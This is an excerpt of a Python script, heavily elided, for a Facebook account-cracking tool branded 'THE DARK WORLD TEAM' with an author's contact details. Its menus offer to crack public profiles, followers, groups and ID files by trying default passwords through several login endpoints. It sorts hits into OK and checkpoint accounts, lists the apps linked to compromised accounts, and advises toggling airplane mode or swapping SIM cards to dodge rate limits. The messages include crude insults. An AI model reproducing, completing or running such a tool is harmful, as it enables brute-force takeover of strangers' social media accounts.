...
def uaku():
	try:
		...
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,Selected,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
...
Github : THE DARK WORLD TEAM -[CYBER ARMY&RECOVARY ZONE]

Facebook : https://www.facebook.com/TeraPaPa.ALAMgir.HoSeN ⭐⭐⭐⭐

Contact : +8801712034653
...
def menu(my_name,my_id):
	...
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]           • Selected Your Terget • [/bold cyan]'))
	print('')
	cetak(nel('[bold green] 🇮🇩1. Crack Publik\n 🇮🇩2. Crack Follower\n 🇮🇩3. Crack Grup\n 🇮🇩4. Crack File\n 🇮🇩5. Hasil Crack\n 🇮🇩0. Exit ALAMGIR [bold green]')) 
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('➥➥➣Selected Yang Bener Kontol ')
				exit()
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('➥➥➣Selected Yang Bener TOLOL ')
				exit()
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}➥➥➣Selected Yang Bener Kontol {u}')
			time.sleep(3)
			back()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]         • PENGEN CARI Selected YANG MANA • [/bold cyan]'))
	print('') 
	cetak(nel('[bold yellow]🇮🇩➣1. Selected Old \n🇮🇩➣2. Selected New\n🇮🇩➣3. Random [bold yellow]'))
	print('')
	hu = input('➥➥➣Selected : ')
	if hu in ['1','01']:
		...
		print('➥➥➣Selected Yang Bener Kontooll ')
		exit()
	cetak(nel('\t[bold cyan]             • METODE LOGIN • [/bold cyan]'))
	print('') 
	cetak(nel('[bold purple]🇮🇩➣1. Mobile(Fast)\n🇮🇩➣2. Mbasic(Disarankan)\n🇮🇩➣3. Touch\n🇮🇩➣4. Mtouch [bold purple]')) 
	print('')
	hc = input('>> Selected : ')
	if hc in ['1','01']:
...
#		method.append('touch')
		...
		method.append('mobile')
	print(f'{m}CATATAN :\n🎀{k}Super FastTIDAK MENAMPILKAN APLIKASI\n🎀Super FastGUNAKAN PASWORD DEPAULT ') 
	print('')
...
def passwrd():
	...
	print('')
	print(f'➥➥➣Hasil {h}OK{u} Selected Di : {h}OK/%s {b}'%(okc))
	print(f'➥➥➣Hasil {k}CP{h} Selected Di : {k}CP/%s {b}'%(cpc))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}ALAMGIR-ID-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					for muncul in apkaktif:
						infoSelected+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1
					...
					for muncul in apkexp:
						hit+=1
						infoSelected += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
...
def cek_opsi():
	c = len(Selected)
	hu = 'Terdapat %s Selected Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	...
	for kes in Selected:
		try:
			try:
				...
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(Selected),id,x), end=' ');sys.stdout.flush()
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di Selected ini.")
	else:
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di Selected ini.")
	else:
		for i in range(len(game)):
